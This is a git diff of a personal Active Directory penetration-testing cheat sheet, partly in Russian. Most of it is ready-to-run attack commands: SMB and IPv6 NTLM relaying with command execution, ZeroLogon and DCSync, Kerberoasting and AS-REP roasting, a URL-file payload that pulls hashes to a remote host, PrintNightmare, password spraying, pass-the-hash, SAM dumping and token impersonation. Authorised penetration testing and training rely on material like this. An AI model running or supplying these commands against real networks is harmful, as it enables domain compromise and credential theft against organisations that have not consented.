@@ -5,7 +5,8 @@ SPN (Service Principal Name) - имя учетной записи служб з�
 Формат записи SPN: "serviceclass"/"hostname[:port]"[/"servicename"], serviceclass - идентифицирует класс службы, например ldap. 
                                                                      servicename - FDQN службы или уникальное имя.
 Перечень SPN: https://adsecurity.org/?page_id=183
-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 ## СБОР ДАННЫХ
 
 ОБЩИЕ РЕСУРСЫ:
@@ -50,7 +51,8 @@ admin:no pass
 Учетные записи администраторов домена -> get-adgroup -filter{GroupCategory -eq 'Security' -AND Name -like "admin"}
 
 Поиск групп Active Directory
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 ## SMB Relay
 1) Update responder config: nano -w /etc/responder/Responder.conf, turn off SMB and HTTP.
 2) Run responder: responder -I eth0 -rdwv
@@ -58,27 +60,32 @@ admin:no pass
 4) Interactive shell: ntlmrelayx.py -tf [file with IP] -smb2support -i Clarify: list shares and use $[share name]
 5) Execute file: ntlmrelayx.py -tf [file with IP] -smb2support -e [filename]
 6) Execute command: ntlmrelayx.py -tf [file with IP] -smb2support -c "whoami"
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 ## GAINING SHELL (SMB enabled and we have user credentials)
 1) psexec OR metasploit psexec
 2) smbexec OR wmiexec OR evil-winrm
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 ## IPv6 Attacks
 1) Install https://github.com/dirkjanm/mitm6.git
 2) Run mitm6 -d [domain name]
 3) Open new tab and run: ntlmrelayx.py -6 -t ldaps://[DC ip] -wh fakewpad.domain_name.local -l loot
 Resource for read: https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 ## PASSBACK ATTACK (Printers and IoT)
 https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 ## ZEROLOGON ATTACK https://www.trendmicro.com/en_us/what-is/zerologon.html
 1) dirkjanm CVE-2020-1472 - https://github.com/dirkjanm/CVE-2020-1472
 2) SecuraBV ZeroLogon Checker - https://github.com/SecuraBV/CVE-2020-1472
    Restore: python3 secretsdump.py Administrator@172.31.3.6 -hashes [LM:NT] //GREP plain_password_hex string
             python3 restorepassword.py sync.csl/SYNC@SYNC -target-ip 172.31.3.6 -hexpass [plain_password_hex]
 3) DCSync Attack: secretsdump.py -just-dc sync.csl/SYNC\$@172.31.3.6
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 ## KERBEROASTING (Credentials)
 1) GetUserSPNs.py domain.local/user:password - RECON SPNs
 2) GetUserSPNs.py domain.local/user:password -dc-ip [DC IP] -request
@@ -90,9 +97,11 @@ https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack
             - Invoke-Mimikatz –Command '" kerberos::list"' /export (модуль PowerSploit)
             - Софт для перебора билета tgsrepcrack.py https://github.com/nidem/kerberoast
             - После взлома пароля: net use \\WIN-4QHPFSI8002\c$ /user:SQLSVC Password1
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 ## GPP Attack (Compromised user, member of AD) https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 ## URL FILE ATTACK
 1) Payload file:
 [InternetShortcut]
@@ -101,21 +110,35 @@ WorkingDirectory=blah
 IconFile=\\x.x.x.x\%USERNAME%.icon
 IconIndex=1
 2) Rename file: @payload
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 ## PrintNightmare (CVE-2021-1675) (POST COMPROMISING ATTACK, PRIVILEGE ESCALATION)
 1) cube0x0 RCE - https://github.com/cube0x0/CVE-2021-1675
 2) calebstewart LPE - https://github.com/calebstewart/CVE-2021-1675
     - Check: rpcdump.py @[dc-ip] | egrep 'MS-RPRN|MS-PAR'
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 ## ASEPRoast
 Get users NTLMv2 hash.
 For attack need to know username and flag 'do not require preauth'
 
 1) GetNPUsers.py -userfile [file] -outputfile [output filename] -dc-ip [DC IP] domain/
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-## CRACKMAPEXEC
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+## CRACKMAPEXEC, SECRETSDUMP.PY
 
 1) SMB SHARE PASSWORD SPRAYING: crackmapexec smb [IP] -u username -p password -d [domain] --no-bruteforce
-2) PASS THE HASH: crackmapexec smb [IP] -u username -H [hash] //--local: local account
+2) PASS THE HASH: crackmapexec smb [IP] -u username -H [hash] //--local-auth: local account
+                  psexec.py
+                  evil-winrm
+3) DUMP LOCAL SAM: secretsdump.py [domain]/[username]:[password]@[TARGET IP]
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+## TOKEN IMPERSONATING WITH INCOGNITO
+Delegate token - login or RDP;
+Impersonate - attaching a network drive or a domain logon script;
 
-
+load_incognito //load module;
+list_tokens -u
+impersonate_token [domain]\\[username]
+shell
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
